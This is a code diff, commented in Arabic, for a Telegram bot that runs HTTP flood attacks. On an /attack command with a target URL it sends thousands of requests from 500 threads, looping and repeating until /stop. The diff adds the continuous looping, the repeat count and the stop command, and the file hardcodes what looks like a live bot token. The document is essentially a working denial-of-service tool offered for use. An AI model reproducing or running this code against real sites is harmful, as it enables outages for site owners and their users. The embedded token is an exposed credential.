@@ -21,10 +21,16 @@ NormalUsers = []
 # استبدل 'YOUR_TOKEN_HERE' بالرمز الخاص بك من BotFather
 bot = telebot.TeleBot('7317402155:AAHNB3hgGqKXiLqF1OhTYLG78HmTlm8dYI4')
 
+# متغيرات التحكم في الهجوم
+attack_in_progress = False
+attack_lock = threading.Lock()
+
 def attack(url):
+    global attack_in_progress
     try:
-        response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
-        print("تم إرسال الطلب إلى:", url)
+        while attack_in_progress:
+            response = scraper.get(url, headers=headers)  # استخدام scraper بدلاً من requests
+            print("تم إرسال الطلب إلى:", url)
     except Exception as e:
         print("حدث خطأ:", e)
 
@@ -32,19 +38,36 @@ def attack(url):
 def send_welcome(message):
     bot.reply_to(message, "مرحباً! أرسل لي رابط الهدف للبدء في الهجوم.")
 
-@bot.message_handler(func=lambda message: True)
-def handle_message(message):
+@bot.message_handler(commands=['stop'])
+def stop_attack(message):
+    global attack_in_progress
+    with attack_lock:
+        attack_in_progress = False
+    bot.reply_to(message, "تم إيقاف الهجوم.")
+    bot.send_message(message.chat.id, "الهجوم تم إيقافه بنجاح.")
+
+@bot.message_handler(commands=['attack'])
+def start_attack(message):
+    global attack_in_progress
     if str(message.chat.id) in Owner or str(message.chat.id) in NormalUsers:
-        url = message.text
+        url = message.text.split()[1]  # افتراض أن الرابط يأتي بعد الأمر مباشرة
+        num_repeats = int(message.text.split()[2]) if len(message.text.split()) > 2 else 1
+        
         start_time = time.time()  # بدء المؤقت
 
         # زيادة عدد الخيوط
         max_workers = 500  # يمكنك تعديل هذا الرقم بناءً على قدرة جهازك والهدف
         num_requests = 10000  # يمكنك أيضاً تعديل عدد الطلبات
 
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            for _ in range(num_requests):
-                executor.submit(attack, url)
+        with attack_lock:
+            attack_in_progress = True
+
+        bot.send_message(message.chat.id, f"الهجوم بدأ على {url} بعدد مرات تكرار {num_repeats}.")
+
+        for _ in range(num_repeats):
+            with ThreadPoolExecutor(max_workers=max_workers) as executor:
+                for _ in range(num_requests):
+                    executor.submit(attack, url)
 
         end_time = time.time()  # انتهاء المؤقت
 
@@ -52,7 +75,7 @@ def handle_message(message):
         elapsed_time = end_time - start_time
 
         # حساب نسبة الإرسال بالطلبات في الثانية
-        requests_per_second = num_requests / elapsed_time
+        requests_per_second = num_requests * num_repeats / elapsed_time
         bot.reply_to(message, f"نسبة إرسال الطلبات: {requests_per_second:.2f} طلب/ثانية")
 
         # استخدام session
@@ -60,5 +83,9 @@ def handle_message(message):
         bot.reply_to(message, response.text)
     else:
         bot.reply_to(message, "عذراً، أنت غير مصرح لك باستخدام هذه الأداة.")
+
+@bot.message_handler(func=lambda message: True)
+def handle_message(message):
+    bot.reply_to(message, "استخدم /attack <الرابط> <عدد مرات التكرار> لبدء الهجوم أو /stop لإيقاف الهجوم.")
 
 bot.polling()
